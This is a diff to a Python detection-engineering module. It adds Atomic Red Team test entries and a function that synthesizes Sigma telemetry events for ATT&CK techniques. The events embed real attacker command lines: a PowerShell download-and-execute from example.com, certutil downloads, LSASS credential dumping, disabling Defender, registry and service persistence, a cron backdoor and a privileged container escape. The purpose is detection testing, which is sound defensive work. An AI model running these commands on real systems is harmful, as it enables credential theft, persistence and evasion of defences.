@@ -9,7 +9,7 @@ import json
 import os
 import re
 from pathlib import Path
-from typing import Dict, List, Optional
+from typing import Any, Dict, List, Optional
 
 # Curated catalog of Atomic Red Team tests for prominent enterprise techniques
 ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
@@ -167,6 +167,78 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "test_id": "ART T1047 #1",
             "command": 'wmic process call create "calc.exe"',
             "telemetry": "Windows Event ID 4688 (wmic.exe with process call create) / WMI-Activity Event ID 5861",
+        },
+    ],
+    "T1543.003": [
+        {
+            "name": "Create Windows Service via sc.exe",
+            "test_id": "ART T1543.003 #1",
+            "command": 'sc.exe create MaliciousService binPath= "C:\\Windows\\Temp\\srv.exe" start= auto',
+            "telemetry": "Sysmon Event ID 1 (sc.exe create) / Event ID 12/13 (Registry modification in HKLM\\System\\CurrentControlSet\\Services)",
+        },
+    ],
+    "T1059.007": [
+        {
+            "name": "Wscript / Cscript Script Execution",
+            "test_id": "ART T1059.007 #1",
+            "command": "cscript.exe //B //Nologo C:\\Windows\\Temp\\stage.js",
+            "telemetry": "Sysmon Event ID 1 (cscript.exe or wscript.exe executing script in Temp directory)",
+        },
+    ],
+    "T1070.004": [
+        {
+            "name": "File Deletion with cipher and sdelete",
+            "test_id": "ART T1070.004 #1",
+            "command": "cipher.exe /w:C:\\Windows\\Temp & del /f /q C:\\Windows\\Temp\\*.tmp",
+            "telemetry": "Sysmon Event ID 1 (cipher.exe with /w argument) / Event ID 23 (FileDelete)",
+        },
+    ],
+    "T1547.001": [
+        {
+            "name": "Persistence via Registry Run Key",
+            "test_id": "ART T1547.001 #1",
+            "command": 'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
+            "telemetry": "Sysmon Event ID 1 (reg.exe add) / Event ID 13 (RegistryValueAdded to ...\\Run)",
+        },
+    ],
+    "T1027": [
+        {
+            "name": "Base64 Decoding via certutil.exe",
+            "test_id": "ART T1027 #1",
+            "command": "certutil.exe -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
+            "telemetry": "Sysmon Event ID 1 (certutil.exe with -decode) / Event ID 11 (File creation of payload.exe)",
+        },
+    ],
+    "T1087.001": [
+        {
+            "name": "Enumerate Local Users via net.exe",
+            "test_id": "ART T1087.001 #1",
+            "command": "net.exe user && net.exe localgroup administrators",
+            "telemetry": "Sysmon Event ID 1 / Windows Event ID 4688 (net.exe user)",
+        },
+    ],
+    "T1087.002": [
+        {
+            "name": "Enumerate Domain Accounts via net.exe",
+            "test_id": "ART T1087.002 #1",
+            "command": "net.exe user /domain",
+            "telemetry": "Sysmon Event ID 1 / Windows Event ID 4688 (net.exe user /domain)",
+        },
+    ],
+    "T1053.003": [
+        {
+            "name": "Linux Cron Persistence via /etc/cron.d",
+            "test_id": "ART T1053.003 #1",
+            "command": "echo \"* * * * * root /bin/bash -c '/dev/shm/c2.sh'\" > /etc/cron.d/test_backdoor",
+            "telemetry": "Linux auditd / Sysmon Event ID 11 (TargetFilename: /etc/cron.d/test_backdoor)",
+        },
+    ],
+    "T1610": [
+        {
+            "name": "Deploy Privileged Container with Host Mount",
+            "test_id": "ART T1610 #1",
+            "command": "docker run --rm --privileged -v /:/host ubuntu:latest nsenter --target 1 --mount -- /bin/bash",
+            "telemetry": "Container Runtime telemetry (Image: ubuntu:latest, Privileged: true, VolumeMount: /:/host)",
         },
     ],
 }
@@ -359,3 +431,394 @@ def format_atomic_tests_markdown(
 
     lines.append("")
     return "\n".join(lines)
+
+
+def synthesize_atomic_telemetry(
+    technique_id: str,
+    workspace: Optional[Path] = None,
+    platforms: Optional[List[str]] = None,
+) -> Dict[str, List[Dict[str, Any]]]:
+    """Synthesize structured, high-fidelity Sigma telemetry events from Atomic Red Team tests.
+
+    Returns a mapping of logsource category to candidate intrusion telemetry events:
+    - process_creation
+    - file_event
+    - registry_set / registry_event
+    - network_connection
+    - dns_query
+    - container_runtime / kubernetes_audit
+    - cloud_audit / identity_audit
+    """
+    from typing import Any
+
+    tid = technique_id.strip().upper()
+    events: Dict[str, List[Dict[str, Any]]] = {}
+
+    def add(cat: str, evt: Dict[str, Any]) -> None:
+        bucket = events.setdefault(cat, [])
+        if evt not in bucket:
+            bucket.append(evt)
+
+    # 1. Specialized High-Fidelity Synthesizers for prominent enterprise techniques
+    if tid == "T1059.001":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine": 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1"',
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAA=",
+                "ParentImage": "C:\\Windows\\explorer.exe",
+                "User": "DOMAIN\\Administrator",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\p.ps1",
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "powershell.exe",
+                "Initiated": "true",
+            },
+        )
+    elif tid == "T1543.003":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\sc.exe",
+                "CommandLine": 'sc.exe create MaliciousService binPath= "C:\\Windows\\Temp\\srv.exe" start= auto',
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\srv.exe",
+                "Image": "C:\\Windows\\System32\\sc.exe",
+            },
+        )
+        add(
+            "registry_set",
+            {
+                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService\\ImagePath",
+                "Details": "C:\\Windows\\Temp\\srv.exe",
+                "Image": "C:\\Windows\\System32\\services.exe",
+            },
+        )
+        add(
+            "registry_event",
+            {
+                "TargetObject": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousService",
+                "Image": "C:\\Windows\\System32\\sc.exe",
+            },
+        )
+    elif tid == "T1053.005":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\schtasks.exe",
+                "CommandLine": 'schtasks.exe /create /sc minute /mo 1 /tn "AtomicValidationTask" /tr "calc.exe"',
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                "User": "NT AUTHORITY\\SYSTEM",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\System32\\Tasks\\AtomicValidationTask",
+                "Image": "C:\\Windows\\System32\\schtasks.exe",
+            },
+        )
+    elif tid == "T1547.001":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\reg.exe",
+                "CommandLine": 'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\\Users\\Public\\update.exe" /f',
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "registry_set",
+            {
+                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
+                "Details": "C:\\Users\\Public\\update.exe",
+                "Image": "C:\\Windows\\System32\\reg.exe",
+            },
+        )
+        add(
+            "registry_event",
+            {
+                "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpdate",
+                "Image": "C:\\Windows\\System32\\reg.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Users\\Public\\update.exe",
+                "Image": "C:\\Windows\\System32\\reg.exe",
+            },
+        )
+    elif tid == "T1003.001":
+        add(
+            "process_creation",
+            {
+                "Image": "procdump.exe",
+                "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+                "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 624 C:\\Windows\\Temp\\lsass.dmp full",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\lsass.dmp",
+                "Image": "C:\\Windows\\System32\\rundll32.exe",
+            },
+        )
+    elif tid == "T1059.007":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\cscript.exe",
+                "CommandLine": "cscript.exe //B //Nologo C:\\Windows\\Temp\\stage.js",
+                "ParentImage": "C:\\Windows\\explorer.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\wscript.exe",
+                "CommandLine": "wscript.exe //E:jscript C:\\Windows\\Temp\\stage.js",
+                "ParentImage": "C:\\Windows\\explorer.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\stage.js",
+                "Image": "C:\\Windows\\System32\\cscript.exe",
+            },
+        )
+    elif tid == "T1070.004":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\cipher.exe",
+                "CommandLine": "cipher.exe /w:C:\\Windows\\Temp",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\evidence.tmp",
+                "Image": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+    elif tid in ("T1027", "T1105"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\certutil.exe",
+                "CommandLine": "certutil.exe -decode C:\\Users\\Public\\payload.b64 C:\\Users\\Public\\payload.exe",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\certutil.exe",
+                "CommandLine": "certutil.exe -urlcache -split -f http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Users\\Public\\payload.exe",
+                "Image": "C:\\Windows\\System32\\certutil.exe",
+            },
+        )
+        add(
+            "file_event",
+            {
+                "TargetFilename": "C:\\Windows\\Temp\\test.txt",
+                "Image": "C:\\Windows\\System32\\certutil.exe",
+            },
+        )
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "example.com",
+                "DestinationPort": 80,
+                "Image": "certutil.exe",
+            },
+        )
+    elif tid in ("T1087.001", "T1087.002", "T1087"):
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\net.exe",
+                "CommandLine": "net.exe user",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\net1.exe",
+                "CommandLine": "net1.exe localgroup administrators",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\net.exe",
+                "CommandLine": "net.exe user /domain",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+    elif tid == "T1053.003":
+        add(
+            "file_event",
+            {
+                "TargetFilename": "/etc/cron.d/test_backdoor",
+                "Image": "/bin/bash",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/crontab",
+                "CommandLine": "crontab -l",
+                "ParentImage": "/bin/bash",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/bash",
+                "CommandLine": "/bin/bash -c '/dev/shm/c2.sh'",
+                "ParentImage": "/usr/sbin/cron",
+            },
+        )
+    elif tid == "T1610":
+        add(
+            "container_runtime",
+            {
+                "Image": "ubuntu:latest",
+                "ContainerName": "atomic-container-escape",
+                "CommandLine": "nsenter --target 1 --mount -- /bin/bash",
+                "Privileged": "true",
+                "VolumeMount": "/:/host",
+            },
+        )
+        add(
+            "kubernetes_audit",
+            {
+                "verb": "create",
+                "resource": "pods",
+                "requestObject.spec.containers.securityContext.privileged": "true",
+            },
+        )
+    elif tid == "T1562.001":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+        add(
+            "registry_set",
+            {
+                "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring",
+                "Details": "1",
+                "Image": "powershell.exe",
+            },
+        )
+    elif tid == "T1036.005":
+        add(
+            "process_creation",
+            {
+                "Image": "C:\\Users\\Public\\svchost.exe",
+                "CommandLine": "C:\\Users\\Public\\svchost.exe -k netsvcs",
+                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            },
+        )
+    elif tid == "T1071.001":
+        add(
+            "network_connection",
+            {
+                "DestinationHostname": "c2-beacon.example.com",
+                "DestinationIp": "198.51.100.99",
+                "DestinationPort": 443,
+                "Image": "powershell.exe",
+            },
+        )
+        add(
+            "dns_query",
+            {
+                "QueryName": "c2-beacon.example.com",
+                "Image": "powershell.exe",
+            },
+        )
+
+    # 2. General Fallback from Atomic Red Team Tests definition
+    tests = get_atomic_tests(tid, workspace=workspace, platforms=platforms)
+    for t in tests:
+        cmd = str(t.get("command") or "").strip()
+        if not cmd or cmd.startswith("#"):
+            continue
+        first_token = cmd.split()[0].replace('"', "").replace("'", "")
+        add(
+            "process_creation",
+            {
+                "CommandLine": cmd,
+                "Image": first_token,
+                "ParentImage": "cmd.exe" if ".exe" in first_token.lower() else "/bin/bash",
+            },
+        )
+
+        paths = re.findall(r"(?:[a-zA-Z]:\\[^\s\"';&|]+|/(?:etc|tmp|var|dev|usr|home)/[^\s\"';&|]+)", cmd)
+        for p in paths:
+            if not p.endswith((".exe", ".dll", ".so")):
+                add("file_event", {"TargetFilename": p, "Image": first_token})
+
+        net_matches = re.findall(r"https?://([a-zA-Z0-9.-]+(?::\d+)?)", cmd)
+        for target in net_matches:
+            host = target.split(":")[0]
+            port = int(target.split(":")[1]) if ":" in target else 80
+            add(
+                "network_connection",
+                {"DestinationHostname": host, "DestinationPort": port, "Image": first_token},
+            )
+            add("dns_query", {"QueryName": host, "Image": first_token})
+
+    return events
